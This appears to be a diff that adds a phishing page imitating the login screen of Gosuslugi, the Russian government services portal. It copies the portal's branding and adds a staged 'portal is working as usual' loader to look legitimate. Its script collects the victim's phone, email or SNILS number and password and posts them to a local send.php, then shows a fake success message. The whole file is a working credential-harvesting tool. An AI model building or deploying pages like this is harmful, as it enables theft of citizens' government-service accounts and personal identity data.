@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги — Вход</title>
+    <link rel="icon" type="image/svg+xml" href="main/logo (1).svg">
+    <style>
+        @font-face {
+            font-family: 'Lato';
+            src: url('Lato-Regular.woff') format('woff');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: 'Lato';
+            src: url('Lato-Bold.woff') format('woff');
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #e4ecfd;
+            font-family: 'Lato', Arial, Helvetica, sans-serif;
+        }
+        .main-wrap {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 48px;
+        }
+        .center-box {
+            width: 330px;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 6px 32px #e6ebf5cc;
+            padding: 40px 26px 0 26px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        .logo-title {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 22px;
+            margin-top: 0;
+        }
+        .gos-title {
+            font-size: 40px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            letter-spacing: 0.5px;
+            font-family: 'Lato', Arial, Helvetica, sans-serif;
+        }
+        .gos-title .blue { color: #0d4cd3; }
+        .gos-title .red { color: #ee3f58; }
+        .lang {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            color: #0d4cd3;
+            font-size: 16px;
+            gap: 6px;
+            font-weight: 400;
+        }
+        .lang-flag {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 1.5px solid #d2dffb;
+            background: #fff;
+            margin-left: 8px;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+        .lang-flag img {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: block;
+            object-fit: cover;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-label {
+            font-size: 14px;
+            margin-bottom: 4px;
+            color: #0b1f33;
+            font-weight: 400;
+        }
+        .form-input {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: none;
+            background: #f5f7fa;
+            font-size: 16px;
+            margin-bottom: 4px;
+            box-sizing: border-box;
+        }
+        .form-input:focus {
+            outline: 2px solid #99b1e6;
+        }
+        .forgot {
+            text-align: left;
+            margin-bottom: 32px;
+        }
+        .forgot a {
+            color: #0d4cd3;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .forgot a:hover,
+        .fail-link:hover,
+        .alt-title a:hover,
+        .register a:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            background: #0d4cd3;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 16px;
+            font-weight: 450;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background 0.2s;
+            height: 48px;
+        }
+        .login-btn:hover {
+            background: #1d5deb;
+        }
+        .fail-link {
+            display: block;
+            text-align: center;
+            color: #0d4cd3;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+        .divider {
+            border: none;
+            border-top: 1px solid #e1e1e1;
+            margin: 32px 0 0 0;
+        }
+        .alt-block {
+            background: #fff;
+            border-radius: 0 0 16px 16px;
+            border-top: 1px solid #e1e1e1;
+            margin: 0 -24px -24px -24px;
+            padding: 24px 24px 0 24px;
+        }
+        .alt-title {
+            text-align: left;
+            font-size: 15px;
+            color: #0b1f33;
+            margin-bottom: 16px;
+        }
+        .alt-title a {
+            color: #0d4cd3;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .alt-btns {
+            display: flex;
+            gap: 16px;
+            justify-content: stretch;
+            margin-bottom: 8px;
+        }
+        .alt-btn {
+            flex: 1;
+            background: #fff;
+            color: #0d4cd3;
+            border: 2px solid #0d4cd3;
+            border-radius: 8px;
+            height: 48px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: border 0.2s, color 0.2s;
+        }
+        .alt-btn:hover {
+            border: 2px solid #1d5deb;
+            color: #1d5deb;
+        }
+        .register {
+            text-align: center;
+            margin: 32px 0 24px 0;
+        }
+        .register a {
+            color: #0d4cd3;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        @media (max-width: 900px) {
+            .main-wrap {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+        /* Стили для загрузчика */
+        .container-app-loader {
+            display: flex;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100vw;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10000000000;
+            background: #fff;
+            opacity: 1;
+        }
+        .container-pulse {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin: -100px 0 0 -100px;
+            width: 200px;
+            height: 200px;
+            opacity: .3;
+        }
+        .pulse {
+            animation-name: pulse;
+            animation-duration: 1.4s;
+            animation-iteration-count: infinite;
+            animation-timing-function: linear;
+        }
+        @keyframes pulse {
+            from {
+                transform: scale3d(.6, .6, .6);
+                opacity: .4
+            }
+            to {
+                transform: scale3d(1.10, 1.10, 1.10);
+                opacity: 0
+            }
+        }
+        .container-app-logo {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin: -61px 0 0 -61px;
+            width: 122px;
+            height: 122px;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .app-logo {
+            position: absolute;
+            left: 51%;
+            top: 53%;
+            margin: -50px 0 0 -50px;
+            width: 100px;
+            height: 100px;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        /* Стили для внешнего загрузчика (из page.html) */
+        .outer-loader-bg {
+            position: fixed;
+            z-index: 100000000000;
+            left: 0; top: 0; width: 100vw; height: 100vh;
+            background: #fafcff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s;
+        }
+        .outer-loader-content {
+            background: #fff;
+            box-shadow: 0 1px 4px #e3ebfc,0 24px 48px rgba(230,235,245,.4);
+            border-radius: 12px;
+            padding: 24px 32px;
+            text-align: center;
+            min-width: 320px;
+        }
+        .outer-loader-title {
+            font-family: 'Lato', Arial, Helvetica, sans-serif;
+            font-weight: 700;
+            font-size: 22px;
+            color: #0b1f33;
+            margin: 0 0 16px 0;
+        }
+        .outer-loader-sub {
+            font-family: 'Lato', Arial, Helvetica, sans-serif;
+            font-size: 16px;
+            color: #66727f;
+            margin-bottom: 18px;
+        }
+        .dot-flashing {
+            width: 16px;
+            height: 16px;
+            background: #c5d3f1;
+            position: relative;
+            border-radius: 50%;
+            animation: dotFlashing 1s infinite alternate;
+            animation-delay: .5s;
+            display: inline-block;
+        }
+        .dot-flashing:before, .dot-flashing:after {
+            content: '';
+            width: 16px;
+            height: 16px;
+            position: absolute;
+            border-radius: 50%;
+            background: #c5d3f1;
+        }
+        .dot-flashing:before {
+            left: -32px;
+            animation: dotFlashing 1s infinite alternate;
+            animation-delay: 0s;
+        }
+        .dot-flashing:after {
+            right: -32px;
+            animation: dotFlashing 1s infinite alternate;
+            animation-delay: 1.2s;
+        }
+        @keyframes dotFlashing {
+            0%,25%,50%{background:#e0e9fc}75%{background:#c5d3f1}100%{background:#99b1e6}
+        }
+    </style>
+</head>
+<body>
+    <!-- Внешний загрузчик (из page.html) -->
+    <div class="outer-loader-bg" id="outer-loader">
+        <div class="outer-loader-content">
+            <img src="main/logo (1).svg" alt="госуслуги" style="height: 38px; margin-bottom: 18px; display: block; margin-left: auto; margin-right: auto;" />
+            <div class="outer-loader-title">Госуслуги сейчас откроются</div>
+            <div class="outer-loader-sub">Портал работает в прежнем режиме.<br>Подождите пару секунд</div>
+            <div class="dot-flashing"></div>
+        </div>
+    </div>
+    <!-- Загрузчик Госуслуг -->
+    <div class="container-app-loader" id="start-app-loader">
+        <div class="container-pulse pulse animated">
+            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 196.7 212.1" enable-background="new 0 0 196.7 212.1" xml:space="preserve">
+                <path fill-rule="evenodd" clip-rule="evenodd" fill="#1D67AD" d="M196.5,94.9c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5,0-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.3-6.2-4.3-13-8.2-18.8c-0.1-0.2-0.2-0.4-0.3-0.6c-3.1-4.6-6.5-8.2-10.3-11c-0.5-0.4-12.7-9.4-28.1-18.5c-0.2-0.1-0.4-0.2-0.6-0.3h0C131.9,10.1,118.6,4,117.8,3.7c0,0,0,0,0,0c-0.9-0.4-1.9-0.8-2.9-1.1c-0.1,0-0.2-0.1-0.3-0.1c-0.5-0.2-0.9-0.3-1.4-0.4c-0.1,0-0.2-0.1-0.4-0.1c-1.5-0.4-3-0.8-4.6-1.1c-0.2,0-0.3-0.1-0.5-0.1c-0.5-0.1-0.9-0.1-1.4-0.2c-0.3,0-0.5-0.1-0.8-0.1c-0.4-0.1-0.9-0.1-1.3-0.1c-0.1,0-0.1,0-0.2,0c-0.1,0-0.2,0-0.4,0c-0.7-0.1-1.4-0.1-2.2-0.2c-0.1,0-0.3,0-0.4,0c-0.2,0-0.4,0-0.6,0c-0.2,0-0.5,0-0.7,0c-0.5,0-0.9,0-1.4,0c0,0,0,0,0,0s0,0,0,0c-0.5,0-0.9,0-1.4,0c-0.2,0-0.5,0-0.7,0c-0.2,0-0.4,0-0.6,0c-0.1,0-0.3,0-0.4,0c-0.7,0-1.4,0.1-2.2,0.2c-0.1,0-0.2,0-0.4,0c-0.1,0-0.1,0-0.2,0c-0.4,0-0.9,0.1-1.3,0.1c-0.3,0-0.5,0.1-0.8,0.1C90,0.6,89.5,0.7,89,0.8c-0.2,0-0.3,0.1-0.5,0.1c-1.6,0.3-3.2,0.6-4.6,1.1c-0.1,0-0.2,0.1-0.4,0.1c-0.5,0.1-0.9,0.3-1.4,0.4c-0.1,0-0.2,0.1-0.3,0.1c-1,0.3-2,0.7-2.9,1.1c0,0,0,0,0,0C78.1,4,64.8,10.1,49.6,19h0c-0.2,0.1-0.4,0.2-0.6,0.3C33.6,28.4,21.5,37.4,21,37.8c-3.8,2.8-7.2,6.4-10.3,11c-0.1,0.2-0.2,0.3-0.3,0.6C6.6,55.3,3.6,62,2.3,68.2c0,0.1,0,0.2-0.1,0.3c-0.1,0.7-0.3,1.4-0.4,2c0,0.1,0,0.2,0,0.3c-0.1,0.4-0.1,0.8-0.1,1.1c0,0.2-0.3,2.6-0.6,6.5c0,0.1,0,0.3,0,0.4C1,79.3,1,79.6,1,80c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0,0.7c-0.3,3.7-0.5,8.2-0.7,13.4c0,0.1,0,0.3,0,0.4C0.1,98.4,0,102.1,0,106s0.1,7.7,0.2,11.2c0,0.1,0,0.3,0,0.4c0.2,5.1,0.4,9.7,0.7,13.4c0,0.2,0,0.5,0,0.7c0,0.1,0,0.3,0,0.4c0,0.4,0.1,0.7,0.1,1.1c0,0.2,0,0.3,0,0.4c0.3,3.9,0.5,6.3,0.6,6.5c0,0.4,0.1,0.8,0.1,1.1c0,0.1,0,0.2,0,0.3c0.1,0.7,0.2,1.3,0.4,2c0,0.1,0,0.2,0.1,0.3c1.3,6.2,4.3,13,8.2,18.8c0.1,0.2,0.1,0.4,0.2,0.5c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c0.9,0.4,1.9,0.8,2.9,1.1c0.1,0,0.3,0.1,0.4,0.1c0.4,0.1,0.9,0.3,1.3,0.4c0.1,0,0.3,0.1,0.4,0.1c1.5,0.4,3,0.8,4.6,1c0.2,0,0.4,0.1,0.5,0.1c0.5,0.1,0.9,0.1,1.4,0.2c0.3,0,0.5,0.1,0.8,0.1c0.4,0.1,0.9,0.1,1.3,0.2c0.1,0,0.1,0,0.2,0c0.1,0,0.2,0,0.3,0c0.7,0.1,1.5,0.1,2.2,0.2c0.1,0,0.3,0,0.4,0c0.2,0,0.4,0,0.6,0c0.2,0,0.5,0,0.7,0c0.5,0,0.9,0,1.4,0c0,0,0,0,0,0s0,0,0,0c0.5,0,0.9,0,1.4,0c0.2,0,0.5,0,0.7,0c0.2,0,0.4,0,0.6,0c0.1,0,0.3,0,0.4,0c0.7,0,1.5-0.1,2.2-0.2c0.1,0,0.2,0,0.3,0c0.1,0,0.1,0,0.2,0c0.4,0,0.9-0.1,1.3-0.2c0.3,0,0.5-0.1,0.8-0.1c0.5-0.1,0.9-0.1,1.4-0.2c0.2,0,0.4-0.1,0.5-0.1c1.6-0.3,3.1-0.6,4.6-1c0.1,0,0.3-0.1,0.4-0.1c0.5-0.1,0.9-0.3,1.3-0.4c0.1,0,0.3-0.1,0.4-0.1c1-0.3,2-0.7,2.9-1.1c0,0,0,0,0,0c0.8-0.3,13-5.9,27.3-14.2h0c0.8-0.5,1.6-0.9,2.5-1.4c15.5-9.1,27.6-18.1,28.1-18.5c3.8-2.8,7.2-6.4,10.3-11c0.1-0.2,0.2-0.3,0.2-0.5c3.9-5.8,6.9-12.5,8.2-18.8c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4c0-0.4,0.1-0.7,0.1-1.1c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2S196.6,98.4,196.5,94.9z"></path>
+            </svg>
+        </div>
+        <div class="container-app-logo">
+            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 196.7 212.1" enable-background="new 0 0 196.7 212.1" xml:space="preserve">
+                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M196.5,94.9c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5,0-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.3-6.2-4.3-13-8.2-18.8c-0.1-0.2-0.2-0.4-0.3-0.6c-3.1-4.6-6.5-8.2-10.3-11c-0.5-0.4-12.7-9.4-28.1-18.5c-0.2-0.1-0.4-0.2-0.6-0.3h0C131.9,10.1,118.6,4,117.8,3.7c0,0,0,0,0,0c-0.9-0.4-1.9-0.8-2.9-1.1c-0.1,0-0.2-0.1-0.3-0.1c-0.5-0.2-0.9-0.3-1.4-0.4c-0.1,0-0.2-0.1-0.4-0.1c-1.5-0.4-3-0.8-4.6-1.1c-0.2,0-0.3-0.1-0.5-0.1c-0.5-0.1-0.9-0.1-1.4-0.2c-0.3,0-0.5-0.1-0.8-0.1c-0.4-0.1-0.9-0.1-1.3-0.1c-0.1,0-0.1,0-0.2,0c-0.1,0-0.2,0-0.4,0c-0.7-0.1-1.4-0.1-2.2-0.2c-0.1,0-0.3,0-0.4,0c-0.2,0-0.4,0-0.6,0c-0.2,0-0.5,0-0.7,0c-0.5,0-0.9,0-1.4,0c0,0,0,0,0,0s0,0,0,0c-0.5,0-0.9,0-1.4,0c-0.2,0-0.5,0-0.7,0c-0.2,0-0.4,0-0.6,0c-0.1,0-0.3,0-0.4,0c-0.7,0-1.4,0.1-2.2,0.2c-0.1,0-0.2,0-0.4,0c-0.1,0-0.1,0-0.2,0c-0.4,0-0.9,0.1-1.3,0.1c-0.3,0-0.5,0.1-0.8,0.1C90,0.6,89.5,0.7,89,0.8c-0.2,0-0.3,0.1-0.5,0.1c-1.6,0.3-3.2,0.6-4.6,1.1c-0.1,0-0.2,0.1-0.4,0.1c-0.5,0.1-0.9,0.3-1.4,0.4c-0.1,0-0.2,0.1-0.3,0.1c-1,0.3-2,0.7-2.9,1.1c0,0,0,0,0,0C78.1,4,64.8,10.1,49.6,19h0c-0.2,0.1-0.4,0.2-0.6,0.3C33.6,28.4,21.5,37.4,21,37.8c-3.8,2.8-7.2,6.4-10.3,11c-0.1,0.2-0.2,0.3-0.3,0.6C6.6,55.3,3.6,62,2.3,68.2c0,0.1,0,0.2-0.1,0.3c-0.1,0.7-0.3,1.4-0.4,2c0,0.1,0,0.2,0,0.3c-0.1,0.4-0.1,0.8-0.1,1.1c0,0.2-0.3,2.6-0.6,6.5c0,0.1,0,0.3,0,0.4C1,79.3,1,79.6,1,80c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0,0.7c-0.3,3.7-0.5,8.2-0.7,13.4c0,0.1,0,0.3,0,0.4C0.1,98.4,0,102.1,0,106s0.1,7.7,0.2,11.2c0,0.1,0,0.3,0,0.4c0.2,5.1,0.4,9.7,0.7,13.4c0,0.2,0,0.5,0,0.7c0,0.1,0,0.3,0,0.4c0,0.4,0.1,0.7,0.1,1.1c0,0.2,0,0.3,0,0.4c0.3,3.9,0.5,6.3,0.6,6.5c0,0.4,0.1,0.8,0.1,1.1c0,0.1,0,0.2,0,0.3c0.1,0.7,0.2,1.3,0.4,2c0,0.1,0,0.2,0.1,0.3c1.3,6.2,4.3,13,8.2,18.8c0.1,0.2,0.1,0.4,0.2,0.5c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c0.9,0.4,1.9,0.8,2.9,1.1c0.1,0,0.3,0.1,0.4,0.1c0.4,0.1,0.9,0.3,1.3,0.4c0.1,0,0.3,0.1,0.4,0.1c1.5,0.4,3,0.8,4.6,1c0.2,0,0.4,0.1,0.5,0.1c0.5,0.1,0.9,0.1,1.4,0.2c0.3,0,0.5,0.1,0.8,0.1c0.4,0.1,0.9,0.1,1.3,0.2c0.1,0,0.1,0,0.2,0c0.1,0,0.2,0,0.3,0c0.7,0.1,1.5,0.1,2.2,0.2c0.1,0,0.3,0,0.4,0c0.2,0,0.4,0,0.6,0c0.2,0,0.5,0,0.7,0c0.5,0,0.9,0,1.4,0c0,0,0,0,0,0s0,0,0,0c0.5,0,0.9,0,1.4,0c0.2,0,0.5,0,0.7,0c0.2,0,0.4,0,0.6,0c0.1,0,0.3,0,0.4,0c0.7,0,1.5-0.1,2.2-0.2c0.1,0,0.2,0,0.3,0c0.1,0,0.1,0,0.2,0c0.4,0,0.9-0.1,1.3-0.2c0.3,0,0.5-0.1,0.8-0.1c0.5-0.1,0.9-0.1,1.4-0.2c0.2,0,0.4-0.1,0.5-0.1c1.6-0.3,3.1-0.6,4.6-1c0.1,0,0.3-0.1,0.4-0.1c0.5-0.1,0.9-0.3,1.3-0.4c0.1,0,0.3-0.1,0.4-0.1c1-0.3,2-0.7,2.9-1.1c0,0,0,0,0,0c0.8-0.3,13-5.9,27.3-14.2h0c0.8-0.5,1.6-0.9,2.5-1.4c15.5-9.1,27.6-18.1,28.1-18.5c3.8-2.8,7.2-6.4,10.3-11c0.1-0.2,0.2-0.3,0.2-0.5c3.9-5.8,6.9-12.5,8.2-18.8c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4c0-0.4,0.1-0.7,0.1-1.1c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2S196.6,98.4,196.5,94.9z"></path>
+            </svg>
+            <div class="app-logo" aria-label="Загрузка" role="status">
+                <img src="main/ico120.png" alt="Логотип" style="width: 100px; height: 100px; object-fit: contain;" />
+            </div>
+        </div>
+    </div>
+    <!-- Основной контент -->
+    <div class="main-wrap" id="main-content" style="display:none;">
+        <div class="center-box">
+            <div class="logo-title">
+                <img src="main/logo (1).svg" alt="госуслуги" style="height: 35px; margin-bottom: 18px;">
+                <div class="lang">Русский <span class="lang-flag"><img src="main/flag-ru.svg" alt="ru"></span></div>
+            </div>
+            <form id="loginForm" autocomplete="on" action="send.php" method="post">
+                <div class="form-group">
+                    <div class="form-label">Телефон / Эл. почта / СНИЛС</div>
+                    <input class="form-input" type="text" name="login" id="login" autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <div class="form-label">Пароль</div>
+                    <input class="form-input" type="password" name="password" id="password" autocomplete="current-password">
+                </div>
+                <div class="forgot"><a href="#">Восстановить</a></div>
+                <button class="login-btn" type="submit">Войти</button>
+            </form>
+            <a class="fail-link" href="#">Не удаётся войти</a>
+            <div class="divider"></div>
+            <div class="alt-block">
+                <div class="alt-title">Войти другим способом. <a href="#">Подробнее</a></div>
+                <div class="alt-btns">
+                    <button class="alt-btn">QR-код</button>
+                    <button class="alt-btn">Эл. подпись</button>
+                </div>
+            </div>
+            <div class="register"><a href="#">Зарегистрироваться</a></div>
+        </div>
+    </div>
+    <script>
+        // Сценарий показа двух загрузчиков
+        window.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('outer-loader').style.display = '';
+            document.getElementById('start-app-loader').style.display = 'none';
+            document.getElementById('main-content').style.display = 'none';
+            setTimeout(function() {
+                document.getElementById('outer-loader').style.display = 'none';
+                document.getElementById('start-app-loader').style.display = '';
+                setTimeout(function() {
+                    document.getElementById('start-app-loader').style.display = 'none';
+                    document.getElementById('main-content').style.display = '';
+                }, 2000);
+            }, 2000);
+        });
+        // Валидация формы и отправка через fetch с логированием ошибок
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var login = document.getElementById('login').value.trim();
+            var password = document.getElementById('password').value;
+            var emailPattern = /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/;
+            var phonePattern = /^\+?7\d{10}$|^8\d{10}$|^\d{10}$/;
+            var snilsPattern = /^\d{3}-\d{3}-\d{3} \d{2}$/;
+            if (!emailPattern.test(login) && !phonePattern.test(login) && !snilsPattern.test(login)) {
+                alert('Введите корректный телефон, e-mail или СНИЛС (XXX-XXX-XXX XX)');
+                return false;
+            }
+            fetch('send.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ login: login, password: password })
+            })
+            .then(function(response) {
+                return response.text().then(function(text) {
+                    if (response.ok) {
+                        alert('Данные успешно отправлены!');
+                        document.getElementById('loginForm').reset();
+                        console.log('Ответ сервера:', text);
+                    } else {
+                        alert('Ошибка при отправке данных: ' + text);
+                        console.error('Ошибка сервера:', text);
+                    }
+                });
+            })
+            .catch(function(error) {
+                alert('Ошибка при отправке данных.');
+                console.error('Ошибка сети:', error);
+            });
+        });
+    </script>
+</body>
+</html>
